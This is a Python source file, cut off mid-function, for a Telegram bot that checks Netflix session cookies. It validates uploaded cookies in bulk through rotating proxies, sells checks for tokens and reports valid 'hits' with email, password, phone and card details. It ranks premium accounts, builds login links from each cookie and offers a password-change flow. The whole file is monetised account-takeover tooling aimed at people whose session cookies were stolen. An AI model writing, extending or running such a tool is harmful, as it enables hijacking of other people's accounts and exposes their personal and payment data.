#!/usr/bin/env python3
"""Netflix Cookie Checker — Telegram Bot"""

import os
import io
import time
import random
import asyncio
import logging
import tempfile
import zipfile
import json
import re
import functools
from datetime import date
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

from checker import check_cookie
import stats as stats_tracker
from dashboard import start_dashboard
import mongodb_store
import user_store
from user_store import TOKEN_PACKS as _TOKEN_PACKS, TOKEN_COSTS as _TOKEN_COSTS
from telegram import LabeledPrice

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.WARNING,
)
for _noisy in ("httpx", "telegram", "apscheduler", "httpcore"):
    logging.getLogger(_noisy).setLevel(logging.ERROR)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")

# ── Payment admin username — set PAYMENT_ADMIN_USERNAME env var ───────────────
# e.g. "mybot_admin" or "@mybot_admin"  (@ is optional)
_RAW_ADMIN_UN = os.environ.get("PAYMENT_ADMIN_USERNAME", "").strip().lstrip("@")
PAYMENT_ADMIN_USERNAME: str = f"@{_RAW_ADMIN_UN}" if _RAW_ADMIN_UN else ""

# ── Admin ID — set ADMIN_ID env var, or first user to /setadmin becomes admin ──
_DB_DIR = Path(os.environ.get("DB_DIR", "."))
_ADMIN_ID_FILE = _DB_DIR / "admin_id.txt"

def _load_admin_id() -> int | None:
    _env = os.environ.get("ADMIN_ID", "").strip()
    if _env.isdigit():
        return int(_env)
    if _ADMIN_ID_FILE.exists():
        try:
            return int(_ADMIN_ID_FILE.read_text().strip())
        except Exception:
            pass
    # Fallback: restore admin_id from MongoDB on fresh deploy
    try:
        import mongo_sync as _ms
        val = _ms.get_setting("admin_id")
        if val is not None:
            uid = int(val)
            _ADMIN_ID_FILE.write_text(str(uid))
            return uid
    except Exception:
        pass
    return None

def _save_admin_id(uid: int) -> None:
    _ADMIN_ID_FILE.write_text(str(uid))
    try:
        import mongo_sync as _ms
        _ms.save_setting("admin_id", uid)
    except Exception:
        pass


def _load_admin_id_mongo() -> int | None:
    """Fallback: restore admin_id from MongoDB if the local file is missing."""
    try:
        import mongo_sync as _ms
        val = _ms.get_setting("admin_id")
        return int(val) if val is not None else None
    except Exception:
        return None

_ADMIN_ID: int | None = _load_admin_id()


def is_admin(uid: int) -> bool:
    return _ADMIN_ID is not None and uid == _ADMIN_ID


# ── Admin proxy add/import flows ─────────────────────────────────────────────
_PROXY_ADD_STATE: set[int] = set()     # admin is typing a single proxy line
_PROXY_SOURCE_STATE: set[int] = set()  # admin is typing a source URL to import from

# ── User proxy add / import flows ────────────────────────────────────────────
_USER_PROXY_ADD_STATE: set[int] = set()  # user is typing a proxy URL to add
_USER_PROXY_URL_STATE: set[int] = set()  # user is typing a URL to import proxies from

# ── Admin broadcast flow ──────────────────────────────────────────────────────
_BROADCAST_PENDING: set[int] = set()  # admin is about to send a broadcast message

# ── Backup group (optional) — set BACKUP_CHAT_ID env var ─────────────────────
_BACKUP_CHAT_ID: int | None = int(os.environ["BACKUP_CHAT_ID"]) if os.environ.get("BACKUP_CHAT_ID", "").lstrip("-").isdigit() else None

_EXECUTOR = ThreadPoolExecutor(max_workers=48)

COOKIE_EXTENSIONS = (".txt", ".json", ".cookie", ".cookies")
COOKIE_MIME_TYPES = {
    "text/plain", "application/json", "text/json",
    "application/octet-stream", "text/csv",
}

# High concurrency — proxies rotate IPs so 429s are spread across different IPs.
BULK_CONCURRENCY = int(os.environ.get("BULK_CONCURRENCY", "16"))

_CANCEL_SESSIONS: set[int] = set()
# Maps uid → epoch timestamp when the session started.
# The watchdog auto-clears sessions stuck longer than SESSION_TIMEOUT_SEC.
_ACTIVE_USERS: dict[int, float] = {}
SESSION_TIMEOUT_SEC = 15 * 60  # 15 minutes
# Maps uid → session_id (status_msg.message_id) for the *currently running* check.
# This is what /cancel uses to stop an in-progress bulk check.
_USER_SESSION: dict[int, int] = {}

# Bot's own Telegram username — set on startup, used as watermark in hit files.
_BOT_USERNAME: str = ""

# Per-user output mode: "full" or "basic"  (default: "basic")
_USER_MODE: dict[int, str] = {}

# Per-user delivery mode: "zip" (default) or "cards" (send each hit as individual card)
_USER_DELIVERY: dict[int, str] = {}

# ── Change Password flow ───────────────────────────────────────────────────
# Maps uid → state dict with keys: step, netflix_id, old_pw, new_pw
_CHANGEPW_STATE: dict[int, dict] = {}

# ── QR photo input state (admin) ───────────────────────────────────────────
_SETQR_STATE: set[int] = set()

# ── Routing choice: ask user when they have both tokens AND own proxies ─────
# "ask" = show popup | "tokens" = always use tokens | "proxies" = always use proxies
_USER_ROUTING_PREF: dict[int, str] = {}
# Pending check state while waiting for routing choice button tap
_ROUTING_CHOICE_STATE: dict[int, dict] = {}

# ── Proxy TXT file-upload flows ───────────────────────────────────────────
_USER_PROXY_FILE_STATE: set[int] = set()   # user uploading a proxy .txt
_PROXY_FILE_STATE: set[int]      = set()   # admin uploading a proxy .txt

# Single-check on-demand NFToken store — keyed by str(session_id).
# Populated when NFToken misses its 1.5s grace window during a single check.
# Purged by the watchdog after _STORE_TTL seconds.
_GEN_LINK_STORE: dict[str, dict] = {}


# ---------------------------------------------------------------------------
# Netflix-only validation helpers
# ---------------------------------------------------------------------------

# Services whose cookies are commonly confused with Netflix
_OTHER_SERVICES: dict[str, str] = {
    "accounts.google.com":  "Google",
    "google.com":           "Google",
    ".amazon.com":          "Amazon",
    "amazon.co":            "Amazon",
    "spotify.com":          "Spotify",
    ".facebook.com":        "Facebook",
    "instagram.com":        "Instagram",
    "youtube.com":          "YouTube",
    "disneyplus.com":       "Disney+",
    ".hulu.com":            "Hulu",
    "hbomax.com":           "HBO Max",
    "max.com":              "Max",
    "primevideo.com":       "Prime Video",
    ".apple.com":           "Apple",
    ".microsoft.com":       "Microsoft",
    "twitter.com":          "Twitter/X",
    "x.com":                "Twitter/X",
    "linkedin.com":         "LinkedIn",
    "twitch.tv":            "Twitch",
    "crunchyroll.com":      "Crunchyroll",
    "hotstar.com":          "Hotstar",
}

# Binary / non-text signatures (magic bytes as hex prefixes)
_BINARY_MAGIC: list[bytes] = [
    b'\xff\xd8\xff',        # JPEG
    b'\x89PNG',             # PNG
    b'GIF8',                # GIF
    b'%PDF',                # PDF
    b'PK\x03\x04',         # ZIP (handled separately)
    b'\x1f\x8b',            # GZIP
    b'MZ',                  # EXE / DLL
    b'\x7fELF',             # ELF binary
    b'BM',                  # BMP
    b'ID3',                 # MP3
    b'\x00\x00\x00',        # various binary formats
]

_NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")


def _has_netflix_markers(text: str) -> bool:
    """Return True if text contains at least one Netflix cookie identifier."""
    return any(m in text for m in _NETFLIX_MARKERS)


def _wrong_service_name(text: str) -> str | None:
    """
    Return the name of the non-Netflix service if the cookie clearly belongs
    to another platform, else None.
    """
    tl = text.lower()
    for domain, name in _OTHER_SERVICES.items():
        if domain in tl:
            return name
    return None


def _is_binary_content(raw: bytes) -> bool:
    """True if the first bytes look like a binary/image/archive file."""
    for magic in _BINARY_MAGIC:
        if raw.startswith(magic):
            return True
    # High ratio of non-printable bytes also indicates binary
    sample = raw[:512]
    non_print = sum(1 for b in sample if b < 9 or (13 < b < 32 and b != 10))
    return len(sample) > 0 and non_print / len(sample) > 0.15


def _validate_cookie_text(text: str) -> tuple[bool, str]:
    """
    Validate that text looks like Netflix cookie data.
    Returns (is_valid, error_message).
    """
    if not text or len(text.strip()) < 10:
        return False, "File is empty or too short."

    wrong = _wrong_service_name(text)
    if wrong and not _has_netflix_markers(text):
        return False, (
            f"This looks like a <b>{wrong}</b> cookie, not Netflix.\n"
            f"Only Netflix cookies (<code>NetflixId</code>, <code>SecureNetflixId</code>) are supported."
        )

    if not _has_netflix_markers(text):
        # Give a specific hint about what's missing
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        sample = lines[0][:80] if lines else text[:80]
        return False, (
            "❌ <b>No Netflix cookies found.</b>\n\n"
            "Required: <code>NetflixId</code> or <code>SecureNetflixId</code> cookie.\n\n"
            f"<i>File starts with:</i> <code>{sample}</code>"
        )

    return True, ""


def _get_mode(user_id: int) -> str:
    return _USER_MODE.get(user_id, "basic")


def _toggle_mode(user_id: int) -> str:
    current = _get_mode(user_id)
    new = "basic" if current == "full" else "full"
    _USER_MODE[user_id] = new
    return new


def _get_delivery(user_id: int) -> str:
    return _USER_DELIVERY.get(user_id, "zip")


def _get_routing_pref(user_id: int) -> str:
    """Return routing preference: 'ask' | 'tokens' | 'proxies'."""
    return _USER_ROUTING_PREF.get(user_id, "ask")


def _set_delivery(user_id: int, mode: str) -> None:
    _USER_DELIVERY[user_id] = mode


# ── Settings panel helpers — shared by /settings, setmode, setdelivery ────

def _settings_text(uid: int) -> str:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    routing  = _get_routing_pref(uid)
    mode_lbl = "📋 Full Info" if mode == "full" else "📄 Basic"
    dlv_lbl  = "💬 Card-by-Card" if delivery == "cards" else "📦 ZIP (default)"
    rout_lbl = {"ask": "❓ Ask Each Time", "tokens": "🪙 Always Tokens", "proxies": "📡 Always Proxies"}.get(routing, "❓ Ask Each Time")
    return (
        "⚙️ <b>Bot Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>Output Format:</b>  {mode_lbl}\n"
        f"  <i>How each account card is displayed</i>\n\n"
        f"📤 <b>Delivery Mode:</b>  {dlv_lbl}\n"
        f"  <i>How bulk hits are sent to you</i>\n\n"
        "  📦 <b>ZIP mode</b> — all hits bundled in one ZIP file\n"
        "        with full details, cookies &amp; login links\n"
        "  💬 <b>Card-by-Card</b> — each hit sent as a separate\n"
        "        message card with login buttons\n\n"
        f"🔀 <b>Check Routing:</b>  {rout_lbl}\n"
        f"  <i>What to use when you have both tokens and own proxies</i>\n\n"
        "Tap a button below to change your preferences:"
    )


def _settings_markup(uid: int) -> InlineKeyboardMarkup:
    mode     = _get_mode(uid)
    delivery = _get_delivery(uid)
    routing  = _get_routing_pref(uid)
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                "✅ Full Info" if mode == "full" else "📋 Full Info",
                callback_data=f"setmode:{uid}:full",
            ),
            InlineKeyboardButton(
                "✅ Basic" if mode == "basic" else "📄 Basic",
                callback_data=f"setmode:{uid}:basic",
            ),
        ],
        [
            InlineKeyboardButton(
                "✅ ZIP Mode" if delivery == "zip" else "📦 ZIP Mode",
                callback_data=f"setdelivery:{uid}:zip",
            ),
            InlineKeyboardButton(
                "✅ Card-by-Card" if delivery == "cards" else "💬 Card-by-Card",
                callback_data=f"setdelivery:{uid}:cards",
            ),
        ],
        [
            InlineKeyboardButton(
                "✅ Ask" if routing == "ask" else "❓ Ask",
                callback_data=f"setroutepref:{uid}:ask",
            ),
            InlineKeyboardButton(
                "✅ Tokens" if routing == "tokens" else "🪙 Tokens",
                callback_data=f"setroutepref:{uid}:tokens",
            ),
            InlineKeyboardButton(
                "✅ Proxies" if routing == "proxies" else "📡 Proxies",
                callback_data=f"setroutepref:{uid}:proxies",
            ),
        ],
        [
            InlineKeyboardButton("❌ Close", callback_data="closesettings"),
        ],
    ])


def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("🛑 Cancel", callback_data=f"cancel:{msg_id}")
    ]])


def _login_keyboard(result: dict) -> InlineKeyboardMarkup | None:
    """Login buttons only — no mode toggle in result messages."""
    nft = result.get("nftoken")
    if nft and nft.get("success"):
        return InlineKeyboardMarkup([[
            InlineKeyboardButton("🖥️ PC Login",    url=nft["pc_url"]),
            InlineKeyboardButton("📱 Phone Login", url=nft["mobile_url"]),
        ]])
    return None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _flag(country: str) -> str:
    country = (country or "").strip()
    for ch in country:
        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
            return ""
    code = country.upper()
    if len(code) == 2 and code.isalpha():
        return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))
    NAME_MAP = {
        "india": "IN", "poland": "PL", "portugal": "PT",
        "united states": "US", "usa": "US", "uk": "GB",
        "united kingdom": "GB", "germany": "DE", "france": "FR",
        "italy": "IT", "spain": "ES", "brazil": "BR", "mexico": "MX",
        "canada": "CA", "australia": "AU", "netherlands": "NL",
        "turkey": "TR", "russia": "RU", "japan": "JP",
        "south korea": "KR", "indonesia": "ID", "thailand": "TH",
        "vietnam": "VN", "pakistan": "PK", "bangladesh": "BD",
        "argentina": "AR", "colombia": "CO", "chile": "CL",
        "romania": "RO", "ukraine": "UA", "sweden": "SE",
        "norway": "NO", "denmark": "DK", "finland": "FI",
        "czech": "CZ", "hungary": "HU", "slovakia": "SK",
        "croatia": "HR", "serbia": "RS", "bulgaria": "BG",
        "greece": "GR", "israel": "IL", "saudi arabia": "SA",
        "uae": "AE", "egypt": "EG", "nigeria": "NG",
        "south africa": "ZA", "kenya": "KE",
    }
    code2 = NAME_MAP.get(country.lower())
    if code2:
        return chr(0x1F1E6 + ord(code2[0]) - ord("A")) + chr(0x1F1E6 + ord(code2[1]) - ord("A"))
    return ""


def _country_display(country: str) -> str:
    flag = _flag(country)
    if flag:
        return f"{country} {flag}"
    return country


def make_progress_bar(done: int, total: int, width: int = 20) -> str:
    if total == 0:
        return f"[{'░' * width}] 0%"
    filled = int(width * done / total)
    bar = "▓" * filled + "░" * (width - filled)
    pct = int(100 * done / total)
    return f"[{bar}] {pct}%"


def _yes_no(val) -> str:
    if val is None:
        return "Unknown"
    return "Yes" if val else "No"


# ---------------------------------------------------------------------------
# Message formatters — Full Mode and Basic Mode
# ---------------------------------------------------------------------------

def _plan_title(plan_name: str, status: str) -> str:
    p = (plan_name or "").lower()
    if status == "free":
        return "🔓 FREE ACCOUNT (No Subscription) 🔓"
    if status == "on_hold":
        return "⏸️ ON HOLD ACCOUNT ⏸️"
    if "premium" in p:
        return "🌟 PREMIUM ACCOUNT 🌟"
    if "standard" in p and "ads" in p:
        return "📺 STANDARD W/ ADS ACCOUNT 📺"
    if "standard" in p:
        return "⭐ STANDARD ACCOUNT ⭐"
    if "basic" in p or "base" in p:
        return "📱 BASIC ACCOUNT 📱"
    if "mobile" in p:
        return "📱 MOBILE ACCOUNT 📱"
    if status == "hit":
        return "✅ VALID ACCOUNT ✅"
    return "❌ INVALID ACCOUNT ❌"


def _status_line(status: str, plan: str) -> str:
    p_lower = (plan or "").lower()
    if status == "hit":
        if "premium" in p_lower:
            return "✅ Status: Valid — Premium 4K Account"
        if "standard" in p_lower and "ads" in p_lower:
            return "✅ Status: Valid — Standard with Ads"
        if "standard" in p_lower:
            return "✅ Status: Valid — Standard Account"
        if "basic" in p_lower:
            return "✅ Status: Valid — Basic Account"
        if "mobile" in p_lower:
            return "✅ Status: Valid — Mobile Account"
        return "✅ Status: Valid Account"
    if status == "free":
        return "🔓 Status: Valid — No Active Subscription"
    if status == "on_hold":
        return "⏸️ Status: On Hold — Payment Issue"
    return "✅ Status: Valid"


def _build_card_line(result: dict) -> str:
    ct = result.get("card_type") or ""
    l4 = result.get("card_last4") or ""
    exp = result.get("card_expiry") or ""
    expired = result.get("card_expired", False)
    partner = result.get("partner_name") or ""
    is_third = result.get("is_third_party", False)

    if is_third and partner:
        return f"{partner} (3rd party billing)"
    if ct:
        parts = [ct.upper() if len(ct) <= 10 else ct]
        if l4:
            parts.append(f"···· {l4}")
        if exp:
            flag = " ⚠️EXPIRED" if expired else ""
            parts.append(f"(exp {exp}{flag})")
        return " ".join(parts)
    return result.get("payment") or "Unknown"


def format_result_full(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Full info mode — all fields shown, matches reference screenshot."""
    status  = result.get("status", "error")
    plan    = result.get("plan_name")   or ""
    email   = result.get("email")       or "Hidden"
    name    = result.get("name")        or ""
    password= result.get("password")    or ""
    phone   = result.get("phone")       or ""
    country = result.get("country")     or "Unknown"
    quality = result.get("quality")     or "Unknown"
    streams = result.get("max_streams") or "Unknown"
    price   = result.get("price")       or "Unknown"
    since   = result.get("member_since") or "Unknown"
    billing = result.get("next_billing") or "Unknown"
    payment = result.get("payment")     or "Unknown"
    nf_id   = result.get("netflix_id")  or ""
    nf_sec  = result.get("secure_netflix_id") or ""
    nf_vid  = result.get("nfvdid")      or ""
    ms_status = result.get("membership_status") or "Unknown"
    profile_names = result.get("profile_names") or []
    profiles_count = result.get("profiles")
    is_on_hold = result.get("is_on_hold", False)
    num_extra = result.get("num_extra_members", 0)
    email_verified = result.get("email_verified")
    is_free_trial = result.get("is_in_free_trial", False)

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)

    title = _plan_title(plan, status)
    if total > 1:
        title += f"\n📊 Account #{index} of {total}"

    lines = [f"<b>{title}</b>", ""]

    if source:
        lines.append(f"📁 Source: {source}")

    lines.append(_status_line(status, plan))
    lines.append("")
    lines.append("👤 <b>Account Details:</b>")

    if name:
        lines.append(f"• Name: {name}")
    lines.append(f"• Email: <code>{email}</code>")
    if password:
        lines.append(f"• Password: <code>{password}</code>")
    lines.append(f"• Country: {_country_display(country)}")
    lines.append(f"• Plan: {plan or 'Unknown'}")
    lines.append(f"• Price: {price}")
    lines.append(f"• Member Since: {since}")
    lines.append(f"• Next Billing: {billing}")
    lines.append(f"• Payment: {payment}")
    if card_line and card_line != payment:
        lines.append(f"• Card: {card_line}")
    if phone:
        lines.append(f"• Phone: <code>{phone}</code> (Yes)")
    else:
        lines.append(f"• Phone: N/A")
    lines.append(f"• Quality: {quality}")
    lines.append(f"• Streams: {streams}")
    lines.append(f"• Hold Status: {'Yes' if (status == 'on_hold' or is_on_hold) else 'No'}")

    # Extra member
    has_extra = num_extra > 0 if isinstance(num_extra, int) else False
    extra_slot = str(num_extra) if has_extra else "N/A"
    lines.append(f"• Extra Member: {'Yes' if has_extra else 'No'}")
    lines.append(f"• Extra Member Slot: {extra_slot}")

    lines.append(f"• Email Verified: {_yes_no(email_verified)}")
    lines.append(f"• Free Trial: {'Yes' if is_free_trial else 'No'}")
    lines.append(f"• Membership Status: {ms_status}")

    # Profiles — use accurate count from __ref array, names where available
    prof_count = result.get("profile_count") or (
        profiles_count if isinstance(profiles_count, int) else
        (len(profile_names) if profile_names else 0)
    )
    lines.append(f"• Connected Profiles: {prof_count if prof_count else 'Unknown'}")
    if profile_names:
        lines.append(f"• Profile Names: {', '.join(profile_names)}")
        if isinstance(prof_count, int) and prof_count > len(profile_names):
            lines.append(f"  <i>(+{prof_count - len(profile_names)} more — names not shown by Netflix on this page)</i>")

    # ── Account warnings ──────────────────────────────────────────────────
    issues = result.get("account_issues") or []
    if issues:
        lines.append("")
        lines.append("⚠️ <b>Account Alerts:</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")

    lines.append("")
    if nf_id:
        lines.append("🍪 <b>Cookie:</b>")
        lines.append(f"<code>NetflixId={nf_id}</code>")
        lines.append("")

    nft = result.get("nftoken")
    if nft and not nft.get("success"):
        lines.append(f"⚠️ <i>Login links: {nft.get('error', 'unavailable')}</i>")

    return "\n".join(lines)


def format_result_basic(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Basic mode — clean, structured card with clear sections."""
    status   = result.get("status", "error")
    plan     = result.get("plan_name")    or ""
    email    = result.get("email")        or "Hidden"
    name     = result.get("name")         or ""
    country  = result.get("country")      or "Unknown"
    quality  = result.get("quality")      or "Unknown"
    streams  = result.get("max_streams")  or "?"
    price    = result.get("price")        or "Unknown"
    billing  = result.get("next_billing") or "Unknown"
    nf_id    = result.get("netflix_id")   or ""
    phone    = result.get("phone")        or ""
    password = result.get("password")     or ""
    issues   = result.get("account_issues") or []
    nft      = result.get("nftoken")

    if not name and "@" in email:
        name = email.split("@")[0].replace(".", " ").title()

    card_line = _build_card_line(result)

    # ── Title ──────────────────────────────────────────────────────────────
    title = _plan_title(plan, status)
    counter = f"  <i>#{index} of {total}</i>" if total > 1 else ""
    lines = [f"<b>{title}</b>{counter}", "━━━━━━━━━━━━━━━━━━━━━━━━━━", ""]

    # ── Status ─────────────────────────────────────────────────────────────
    lines.append(_status_line(status, plan))
    lines.append("")

    # ── Identity ───────────────────────────────────────────────────────────
    lines.append("👤 <b>Account</b>")
    if name:
        lines.append(f"  • Name:     {name}")
    lines.append(f"  • Email:    <code>{email}</code>")
    if password:
        lines.append(f"  • Password: <code>{password}</code>")
    if phone:
        lines.append(f"  • Phone:    {phone}")
    lines.append("")

    # ── Subscription ───────────────────────────────────────────────────────
    flag = _flag(country)
    country_disp = f"{country} {flag}".strip() if flag else country
    lines.append("📋 <b>Subscription</b>")
    lines.append(f"  • Country:  {country_disp}")
    lines.append(f"  • Plan:     {plan or 'Unknown'}")
    lines.append(f"  • Quality:  {quality}  ·  {streams} screens")
    lines.append(f"  • Price:    {price}")
    lines.append(f"  • Billing:  {billing}")
    if card_line and card_line not in ("Unknown", ""):
        lines.append(f"  • Payment:  {card_line}")
    lines.append("")

    # ── Cookie ─────────────────────────────────────────────────────────────
    if nf_id:
        lines.append(f"🍪 <code>NetflixId={nf_id}</code>")
        lines.append("")

    # ── Warnings ───────────────────────────────────────────────────────────
    if issues:
        lines.append("⚠️ <b>Account Issues</b>")
        for issue in issues:
            lines.append(f"  🔴 {issue}")
        lines.append("")

    # ── Login note ─────────────────────────────────────────────────────────
    if nft and not nft.get("success"):
        lines.append(f"<i>⚠️ Login links unavailable: {nft.get('error', 'unknown error')}</i>")

    # trim trailing blank lines
    while lines and lines[-1] == "":
        lines.pop()

    return "\n".join(lines)


def format_error_card(result: dict, index: int = 1, total: int = 1, source: str = "") -> str:
    """Styled card for error / invalid accounts — shows source + reason."""
    status  = result.get("status", "error")
    message = result.get("message") or ""
    nf_id   = result.get("netflix_id") or ""

    counter = f"  #{index}/{total}" if total > 1 else ""

    if status == "invalid":
        header = f"❌ <b>INVALID / EXPIRED{counter}</b>"
        reason = message or "Cookie is expired or invalid."
        icon   = "❌"
    else:
        header = f"⚠️ <b>ERROR{counter}</b>"
        reason = message or "Unknown error."
        icon   = "⚠️"

    lines = [header, ""]
    if source:
        lines.append(f"📁 Source: {source}")
    lines.append(f"{icon} Reason: <i>{reason}</i>")
    if nf_id:
        snippet = nf_id[:40] + "…" if len(nf_id) > 40 else nf_id
        lines.append(f"🍪 Cookie: <code>NetflixId={snippet}</code>")

    return "\n".join(lines)


def format_result(result: dict, index: int = 1, total: int = 1, source: str = "", user_id: int = 0) -> str:
    try:
        status = result.get("status", "error")
        if status in ("error", "invalid"):
            return format_error_card(result, index, total, source)
        mode = _get_mode(user_id) if user_id else "basic"
        if mode == "basic":
            return format_result_basic(result, index, total, source)
        return format_result_full(result, index, total, source)
    except Exception as e:
        logger.exception("format_result crashed for status=%s", result.get("status"))
        return (
            f"⚠️ <b>Display error</b> — could not render account card.\n"
            f"<i>{type(e).__name__}: {e}</i>\n\n"
            f"Account #{index} of {total}"
        )


# ---------------------------------------------------------------------------
# Cookie splitting
# ---------------------------------------------------------------------------

_HIT_BLOCK_COOKIE_RE = re.compile(r'[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*\S{20,}')
# Matches separator lines: ──────────────── or ════════ or --------- (8+ chars)
_HIT_SEPARATOR_RE  = re.compile(r'(?m)^[\u2500\u2550\-=─═]{8,}\s*$')


def split_cookies_from_text(text: str) -> list[str]:
    try:
        from checker import universal_extract_accounts
        text = text.strip()
        if not text:
            return []

        if text.startswith("[["):
            try:
                outer = json.loads(text)
                if isinstance(outer, list) and all(isinstance(i, list) for i in outer):
                    return [json.dumps(inner) for inner in outer]
            except Exception:
                pass

        if text.startswith("[") or text.startswith("{"):
            return [text]

        # ── Hit-file format detection ──────────────────────────────────────────
        if _HIT_BLOCK_COOKIE_RE.search(text) and _HIT_SEPARATOR_RE.search(text):
            parts = _HIT_SEPARATOR_RE.split(text)
            valid = []
            for part in parts:
                part = part.strip()
                if part and _HIT_BLOCK_COOKIE_RE.search(part):
                    valid.append(part)
            if valid:
                return valid
        # ── Standard formats (Netscape, JSON, combo, NetflixId-anchored) ──────
        try:
            blocks = universal_extract_accounts(text)
        except Exception:
            blocks = []
        if blocks:
            return blocks

        return [text]
    except Exception:
        return [text] if text.strip() else []


# ---------------------------------------------------------------------------
# ZIP extractor (input)
# ---------------------------------------------------------------------------

_ZIP_ENTRY_LIMIT = 2000   # max files read from a single ZIP

def read_cookie_texts_from_zip(zip_path: str) -> list[tuple[str, str]]:
    """
    Extract cookie text files from a ZIP.
    Handles: corrupt ZIPs, password-protected ZIPs, huge ZIPs (capped at
    _ZIP_ENTRY_LIMIT entries), binary-only ZIPs, and individual bad entries.
    Raises BadZipFile for fundamentally corrupt archives so the caller
    can give the user a specific error message.
    """
    results = []
    read_count = 0
    with zipfile.ZipFile(zip_path, "r") as zf:
        for info in zf.infolist():
            if read_count >= _ZIP_ENTRY_LIMIT:
                break
            name = info.filename
            base = Path(name).name
            if not base or base.startswith("_") or base.startswith("."):
                continue
            ext = Path(name).suffix.lower()
            if ext not in COOKIE_EXTENSIONS:
                continue
            try:
                raw = zf.read(name)
                if _is_binary_content(raw):
                    continue
                text = raw.decode("utf-8", errors="replace").strip()
                if text:
                    results.append((base, text))
                    read_count += 1
            except Exception:
                continue
    return results


# ---------------------------------------------------------------------------
# Account quality scorer
# ---------------------------------------------------------------------------

def _score_account(result: dict) -> tuple:
    """
    Score an account for quality ranking. Higher tuple = better account.
    Criteria (priority order):
      1. Plan tier  (Premium > Standard > Basic > Mobile > unknown)
      2. No account issues
      3. Not on hold
      4. Days until next billing  (more = subscription lasts longer)
      5. Member age in days       (older = more established account)
    """
    from datetime import datetime, date as _date

    plan = (result.get("plan_name") or "").lower()
    if "premium" in plan:
        plan_score = 5
    elif "standard" in plan and "ads" not in plan:
        plan_score = 4
    elif "standard" in plan:
        plan_score = 3
    elif "basic" in plan or "base" in plan:
        plan_score = 2
    elif "mobile" in plan:
        plan_score = 1
    else:
        plan_score = 0

    no_issues = 0 if result.get("account_issues") else 1
    not_hold  = 0 if result.get("is_on_hold") else 1

    billing_days = 0
    billing_str = result.get("next_billing") or ""
    if billing_str and billing_str not in ("Unknown", ""):
        try:
            dt = datetime.strptime(billing_str, "%B %d, %Y")
            billing_days = max(0, (dt.date() - _date.today()).days)
        except Exception:
            pass

    member_days = 0
    since_str = result.get("member_since") or ""
    if since_str and since_str not in ("Unknown", ""):
        try:
            dt = datetime.strptime(since_str, "%B %d, %Y")
            member_days = (_date.today() - dt.date()).days
        except Exception:
            pass

    return (plan_score, no_issues, not_hold, billing_days, member_days)


# ---------------------------------------------------------------------------
# ZIP builder (hits output)
# ---------------------------------------------------------------------------

async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> None:
    """
    Build and send a single ZIP — Netflix-Hits-{date}-{N}x.zip
    Structure:
      Premium Hits/  — one .txt per premium account
      Normal Hits/   — one .txt per non-premium account
      _SUMMARY.txt   — totals overview
    Each account file is fully decorated with details + cookies + login link.
    Login links are generated for all accounts in parallel before building the ZIP.
    """
    from checker import generate_nftoken

    loop = asyncio.get_running_loop()
    today = date.today().isoformat()
    exp = "9999999999"

    # ── Deduplicate by NetflixId ───────────────────────────────────────────
    seen_ids: set[str] = set()
    deduped: list[tuple[dict, str, str]] = []
    for item in hits:
        nf_id = item[0].get("netflix_id") or ""
        if nf_id and nf_id in seen_ids:
            continue
        if nf_id:
            seen_ids.add(nf_id)
        deduped.append(item)

    dupes_removed = len(hits) - len(deduped)

    # ── Generate NFTokens for every hit in one parallel burst ─────────────
    async def _gen_token(result: dict) -> None:
        try:
            nf_id = result.get("netflix_id")
            if nf_id:
                nft = await loop.run_in_executor(
                    _EXECUTOR, generate_nftoken, {"NetflixId": nf_id}
                )
                result["nftoken"] = nft
        except Exception as _e:
            result["nftoken"] = {"success": False, "error": str(_e)}

    await asyncio.gather(*[_gen_token(r) for r, _, _ in deduped], return_exceptions=True)

    # ── Categorise ────────────────────────────────────────────────────────
    premium = [(r, s, w) for r, s, w in deduped
               if "premium" in (r.get("plan_name") or "").lower()]
    normal  = [(r, s, w) for r, s, w in deduped
               if "premium" not in (r.get("plan_name") or "").lower()]

    # ── Per-account decorated file builder ────────────────────────────────
    def _account_file(i: int, total: int, result: dict, source: str) -> str:
        email   = result.get("email")        or f"account_{i}"
        name    = result.get("name")         or ""
        pwd     = result.get("password")     or ""
        phone   = result.get("phone")        or ""
        country = result.get("country")      or "Unknown"
        plan    = result.get("plan_name")    or "Unknown"
        quality = result.get("quality")      or "Unknown"
        streams = result.get("max_streams")  or "?"
        price   = result.get("price")        or "Unknown"
        since   = result.get("member_since") or "Unknown"
        billing = result.get("next_billing") or "Unknown"
        payment = result.get("payment")      or "Unknown"
        ct      = result.get("card_type")    or ""
        cl4     = result.get("card_last4")   or ""
        cexp    = result.get("card_expiry")  or ""
        profiles= ", ".join(result.get("profile_names") or [])
        ev      = ("Yes"     if result.get("email_verified") is True
                   else "No" if result.get("email_verified") is False
                   else "Unknown")
        ms      = result.get("membership_status") or ""
        nf_id   = result.get("netflix_id")        or ""
        nf_sec  = result.get("secure_netflix_id") or ""
        nf_vid  = result.get("nfvdid")            or ""
        num_ex     = result.get("num_extra_members")  or 0
        status     = result.get("status")            or "hit"
        is_hold    = result.get("is_on_hold", False) or (status == "on_hold")
        free_trial = result.get("is_in_free_trial",  False)
